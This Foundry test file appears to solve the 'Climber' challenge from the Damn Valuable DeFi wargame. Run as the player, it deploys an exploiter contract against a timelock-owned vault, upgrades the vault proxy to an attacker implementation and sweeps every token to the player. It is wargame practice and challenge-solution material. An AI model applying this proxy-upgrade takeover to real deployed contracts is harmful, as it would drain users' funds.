// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Upgrades} from "@openzeppelin/foundry-upgrades/Upgrades.sol";
import {ClimberVault} from "../src/ClimberVault.sol";
import {ClimberTimelock} from "../src/ClimberTimelock.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {PROPOSER_ROLE, ADMIN_ROLE} from "../src/ClimberConstants.sol";

import {ClimberExploiter} from "../src/ClimberExploiter.sol";

contract ClimberExploiterTest is Test {
    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000;
    uint256 constant PLAYER_INITIAL_BALANCE = 0.1 ether;
    uint64 constant TIMELOCK_DELAY = 60 * 60;

    address deployer;
    address proposer;
    address sweeper;
    address player;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    ClimberExploiter exploiter;

    function setUp() public {
        player = address(86767);
        deployer = address(58945);
        proposer = address(76483);
        sweeper = address(34756);

        vm.deal(player, PLAYER_INITIAL_BALANCE);

        vault = ClimberVault(
            Upgrades.deployUUPSProxy(
                "ClimberVault.sol",
                abi.encodeCall(
                    ClimberVault.initialize,
                    (deployer, proposer, sweeper)
                )
            )
        );
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.owner() != address(0));
        assertTrue(vault.owner() != deployer);

        timelock = ClimberTimelock(payable(vault.owner()));
        assertEq(timelock.delay(), TIMELOCK_DELAY);

        vm.expectRevert();
        timelock.updateDelay(TIMELOCK_DELAY + 1);

        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        vm.startPrank(deployer);
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_Attack() public {
        vm.startPrank(player);
        exploiter = new ClimberExploiter(timelock, vault, player);
        exploiter.attack();

        Upgrades.upgradeProxy(
            address(vault),
            "ClimberExploiterImplementation.sol",
            ""
        );
        vault.sweepFunds(address(token));
        vm.stopPrank();

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(player), VAULT_TOKEN_BALANCE);
    }
}
